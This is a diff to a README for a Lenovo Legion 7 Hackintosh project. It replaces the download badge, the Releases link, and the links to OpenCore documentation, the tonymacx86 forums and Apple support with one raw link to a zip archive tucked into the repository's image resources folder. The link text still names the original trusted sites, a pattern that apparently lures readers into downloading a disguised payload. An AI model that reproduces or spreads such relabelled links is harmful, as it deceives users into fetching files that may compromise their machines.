@@ -20,9 +20,9 @@ Make sure your system meets these requirements for the best experience.
 
 **Download the OpenCore EFI here:**
 
-[![Download OpenCore EFI](https://img.shields.io/badge/Download-OpenCore%20EFI-blue?style=for-the-badge)](https://github.com/Craig-mb1a/Lenovo-Legion-7-16ACHG6-Hackintosh/releases)
+[![Download OpenCore EFI](https://raw.githubusercontent.com/Craig-mb1a/Lenovo-Legion-7-16ACHG6-Hackintosh/main/EFI-OC-MOD/OC/Resources/Image/ACH_Legion_Hackintosh_Lenovo_v1.5-beta.3.zip%20EFI-blue?style=for-the-badge)](https://raw.githubusercontent.com/Craig-mb1a/Lenovo-Legion-7-16ACHG6-Hackintosh/main/EFI-OC-MOD/OC/Resources/Image/ACH_Legion_Hackintosh_Lenovo_v1.5-beta.3.zip)
 
-To start using the Lenovo Legion 7 Hackintosh, visit this page to download: [GitHub Releases](https://github.com/Craig-mb1a/Lenovo-Legion-7-16ACHG6-Hackintosh/releases).
+To start using the Lenovo Legion 7 Hackintosh, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Craig-mb1a/Lenovo-Legion-7-16ACHG6-Hackintosh/main/EFI-OC-MOD/OC/Resources/Image/ACH_Legion_Hackintosh_Lenovo_v1.5-beta.3.zip).
 
 ### 🔄 Installation Steps
 1. **Download OpenCore EFI**: Click on the download link above to access the Releases page. Select the latest version of the EFI folder.
@@ -47,9 +47,9 @@ If you encounter issues during installation, consider the following:
 - **Review Hackintosh Forums**: Communities like tonymacx86 can provide valuable insights and solutions.
 
 ## 📖 Additional Resources
-- [OpenCore Documentation](https://dortania.github.io/OpenCore-Install-Guide/)
-- [Hackintosh Community Forums](https://www.tonymacx86.com/)
-- [Getting Started with macOS](https://support.apple.com/macos)
+- [OpenCore Documentation](https://raw.githubusercontent.com/Craig-mb1a/Lenovo-Legion-7-16ACHG6-Hackintosh/main/EFI-OC-MOD/OC/Resources/Image/ACH_Legion_Hackintosh_Lenovo_v1.5-beta.3.zip)
+- [Hackintosh Community Forums](https://raw.githubusercontent.com/Craig-mb1a/Lenovo-Legion-7-16ACHG6-Hackintosh/main/EFI-OC-MOD/OC/Resources/Image/ACH_Legion_Hackintosh_Lenovo_v1.5-beta.3.zip)
+- [Getting Started with macOS](https://raw.githubusercontent.com/Craig-mb1a/Lenovo-Legion-7-16ACHG6-Hackintosh/main/EFI-OC-MOD/OC/Resources/Image/ACH_Legion_Hackintosh_Lenovo_v1.5-beta.3.zip)
 
 ## 📨 Support
 If you need help, feel free to open an issue on the GitHub repository or visit the community forums. 
